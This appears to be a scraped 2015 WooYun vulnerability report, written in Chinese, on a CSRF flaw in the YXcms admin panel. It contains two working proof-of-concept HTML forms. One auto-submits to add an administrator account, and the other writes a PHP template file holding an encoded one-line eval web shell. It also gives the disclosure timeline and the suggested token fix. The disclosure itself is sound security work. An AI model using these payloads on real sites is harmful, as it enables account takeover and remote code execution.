{"id": 39663, "wybug_id": "wooyun-2015-093540", "wybug_title": "YXcms后台csrf添加管理员+getshell", "wybug_corp": "yxcms.net", "wybug_author": "蛇精病", "wybug_date": "2015-01-30 15:19", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["蛇精病"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-30：\t细节向公众公开  简要描述： YXcms后台csrf添加管理员+getshell 详细说明：  没有任何验证，加上他又一个模版功能可建立php文件，导致getshell   漏洞证明：  1、后台添加管理然后用burp截断\n\n我们发现没有验证，然后就构造表单\n<html>  <!-- CSRF PoC - generated by Burp Suite Professional -->  <body>    <form id=\"post123\" name=\"post123\" action=\"http://127.0.0.1/index.php?r=admin/admin/index\" method=\"POST\">      <input type=\"hidden\" name=\"groupid\" value=\"1\" />      <input type=\"hidden\" name=\"username\" value=\"snake\" />      <input type=\"hidden\" name=\"rpassword\" value=\"wuyun1\" />      <input type=\"hidden\" name=\"spassword\" value=\"wuyun1\" />      <input type=\"hidden\" name=\"realname\" value=\"\" />      <input type=\"hidden\" name=\"iflock\" value=\"0\" />       <script>        document.getElementById('post123').submit();    </script>    </form>  </body></html>\n2、再来看如何getshell模版，新建\n\n插入一句话木马，然后截断\n\n同样没有验证，构造表单如下\n<html>  <!-- CSRF PoC - generated by Burp Suite Professional -->  <body>    <form action=\"http://127.0.0.1/index.php?r=admin/set/tpadd&Mname=default\" method=\"POST\">      <input type=\"hidden\" name=\"filename\" value=\"1\" />      <input type=\"hidden\" name=\"code\" value=\"&lt;&#63;php&#32;eval&#40;&#36;&#95;POST&#91;g&#93;&#41;&#59;&#63;&gt;\" />      <input type=\"submit\" value=\"Submit request\" />    </form>  </body></html>\n接下来用菜刀连接试试\n\n连接成功   修复方案：  token   版权声明：转载请注明来源 蛇精病@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2015-01-30 15:21 厂商回复： 谢谢您的提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}